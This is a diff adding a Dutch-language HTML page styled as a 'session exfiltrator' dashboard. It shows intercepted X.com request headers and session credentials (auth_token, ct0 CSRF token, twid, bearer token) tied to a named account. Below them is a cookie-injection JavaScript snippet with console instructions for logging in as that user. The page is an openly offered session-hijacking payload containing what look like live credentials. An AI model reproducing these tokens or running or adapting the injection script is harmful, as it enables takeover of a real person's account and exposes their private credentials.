@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VORTEX v72 // SESSION EXFILTRATOR</title>
+    <style>
+        :root {
+            --vortex-cyan: #00e5ff;
+            --vortex-magenta: #ff00ff;
+            --vortex-yellow: #ffea00;
+            --vortex-bg: #050608;
+            --panel-bg: #0a0c11;
+            --border: rgba(0, 229, 255, 0.25);
+            --text-dim: #6c7a89;
+            --alert-red: #ff0033;
+            --neon-green: #00ff66;
+        }
+
+        body {
+            background-color: var(--vortex-bg);
+            color: var(--vortex-cyan);
+            font-family: 'Courier New', Courier, monospace;
+            margin: 0;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            border-bottom: 2px solid var(--alert-red);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+
+        .header h1 {
+            margin: 0;
+            font-size: 1.8rem;
+            color: #fff;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px var(--alert-red);
+        }
+
+        .header p {
+            color: var(--text-dim);
+            font-size: 0.85rem;
+            margin-top: 5px;
+            text-transform: uppercase;
+        }
+
+        .alert-banner {
+            background-color: rgba(255, 0, 51, 0.15);
+            border: 1px solid var(--alert-red);
+            color: #fff;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px rgba(255, 0, 51, 0.3);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 15px rgba(255, 0, 51, 0.3); }
+            50% { box-shadow: 0 0 30px rgba(255, 0, 51, 0.7); }
+            100% { box-shadow: 0 0 15px rgba(255, 0, 51, 0.3); }
+        }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 20px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .panel {
+            background: var(--panel-bg);
+            border: 1px solid var(--border);
+            position: relative;
+            box-shadow: inset 0 0 20px rgba(0, 229, 255, 0.02);
+        }
+
+        .panel::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 3px;
+            background: linear-gradient(90deg, var(--vortex-cyan), transparent);
+        }
+
+        .panel-title {
+            background: rgba(0, 229, 255, 0.08);
+            color: #fff;
+            padding: 10px 15px;
+            font-weight: bold;
+            font-size: 0.95rem;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .panel-content {
+            padding: 15px;
+        }
+
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 0.85rem;
+            border-bottom: 1px dashed rgba(255,255,255,0.05);
+            padding-bottom: 4px;
+        }
+
+        .data-label { color: var(--text-dim); min-width: 200px; }
+        .data-val { color: #fff; text-align: right; word-break: break-all; font-family: monospace; }
+        
+        .val-critical { color: var(--alert-red); font-weight: bold; text-shadow: 0 0 5px var(--alert-red); }
+        .val-auth { color: var(--vortex-magenta); font-weight: bold; }
+        .val-ok { color: var(--neon-green); }
+
+        .btn-inject {
+            display: block;
+            width: 100%;
+            background: rgba(255, 0, 51, 0.1);
+            border: 1px solid var(--alert-red);
+            color: var(--alert-red);
+            padding: 15px;
+            text-align: center;
+            margin-top: 20px;
+            cursor: pointer;
+            font-family: inherit;
+            font-weight: bold;
+            font-size: 1.1rem;
+            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .btn-inject:hover {
+            background: rgba(255, 0, 51, 0.3);
+            box-shadow: 0 0 20px rgba(255, 0, 51, 0.6);
+            color: #fff;
+        }
+
+        .code-block {
+            background: #000;
+            padding: 10px;
+            border: 1px solid #333;
+            color: #ccc;
+            font-size: 0.75rem;
+            white-space: pre-wrap;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <h1>VORTEX // SESSION EXFILTRATOR</h1>
+        <p>RAW HTTP HEADERS ONDERSCHEPT // DOELWIT SESSie: ACTIEF</p>
+    </div>
+
+    <div class="alert-banner">
+        [!] LEVEL 1 AUTORISATIE TOKENS GEVONDEN [!] <br>
+        <span style="font-size: 0.85rem; font-weight: normal;">Sessie Hijack mogelijk. Authenticatie-cookies (auth_token & ct0) succesvol geëxtraheerd.</span>
+    </div>
+
+    <div class="dashboard-grid">
+
+        <div class="panel">
+            <div class="panel-title" style="border-left-color: var(--vortex-cyan);">
+                <span>[01] REQUEST METADATA</span>
+                <span class="val-ok">CAPTURED</span>
+            </div>
+            <div class="panel-content">
+                <div class="data-row"><span class="data-label">Host:</span> <span class="data-val">x.com</span></div>
+                <div class="data-row"><span class="data-label">Referer (Locatie Target):</span> <span class="data-val">https://x.com/renegade0021</span></div>
+                <div class="data-row"><span class="data-label">User-Agent:</span> <span class="data-val">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0</span></div>
+                <div class="data-row"><span class="data-label">X-Twitter-Active-User:</span> <span class="data-val val-ok">yes</span></div>
+                <div class="data-row"><span class="data-label">X-Client-Transaction-ID:</span> <span class="data-val" style="font-size: 0.7rem;">1CSgRUTgv+b9yumj2RAtjm6idGpMGONtk7Jc9w8LwwymvM4Y3d1iTmTZPhXtJaIeCAmoRtHXnBS74QtpISNIYSU5HDxB1w</span></div>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-title" style="border-left-color: var(--alert-red);">
+                <span>[02] CREDENTIALS & TOKENS (CRITICAL)</span>
+                <span class="val-critical">UNENCRYPTED</span>
+            </div>
+            <div class="panel-content">
+                <div class="data-row">
+                    <span class="data-label">TWID (Target ID):</span> 
+                    <span class="data-val val-auth">u=2033886068991528962 (@Wbout1)</span>
+                </div>
+                <div class="data-row">
+                    <span class="data-label">AUTH_TOKEN (Sessie Sleutel):</span> 
+                    <span class="data-val val-critical">3edae275d2abf1cd6dee918cba71099bd66e50a1</span>
+                </div>
+                <div class="data-row">
+                    <span class="data-label">CT0 / X-CSRF-TOKEN:</span> 
+                    <span class="data-val val-critical" style="font-size: 0.7rem;">f5968fd90f4595e4cd17fb190a842da01c3997878cc8b7999efd4bb070105af2f75344027b5338fcd77fdd60e9ec709fa98453fa6db936bbacf2b872dce04fb09755ef98a69ab31bc75a2989a4a811e3</span>
+                </div>
+                <div class="data-row">
+                    <span class="data-label">Bearer Token (Public API):</span> 
+                    <span class="data-val" style="font-size: 0.7rem; color: #aaa;">AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="panel">
+            <div class="panel-title" style="border-left-color: var(--vortex-magenta);">
+                <span>[03] SESSION INJECTION SCRIPT</span>
+                <span class="val-auth">READY</span>
+            </div>
+            <div class="panel-content">
+                <p style="font-size: 0.8rem; margin-top: 0; color: var(--text-dim);">Draai dit script in de browser console op x.com om direct in te loggen als het doelwit.</p>
+                <div class="code-block">
+// VORTEX AUTO-INJECTOR
+document.cookie = "auth_token=3edae275d2abf1cd6dee918cba71099bd66e50a1; domain=.x.com; path=/; secure";
+document.cookie = "ct0=f5968fd90f4595e4cd17fb190a842da01c3997878cc8b7999efd4bb070105af2f75344027b5338fcd77fdd60e9ec709fa98453fa6db936bbacf2b872dce04fb09755ef98a69ab31bc75a2989a4a811e3; domain=.x.com; path=/; secure";
+document.cookie = "twid=u%3D2033886068991528962; domain=.x.com; path=/; secure";
+console.log("[VORTEX] Cookies injected. Reloading page...");
+location.reload();
+                </div>
+                
+                <button class="btn-inject" onclick="alert('VORTEX BRIDGE ACTIEF: Om de hijack te voltooien, injecteer de JavaScript payload in de X.com console.')">
+                    VERBREEK SESSIE & NEEM OVER (HIJACK)
+                </button>
+            </div>
+        </div>
+
+    </div>
+
+</body>
+</html>
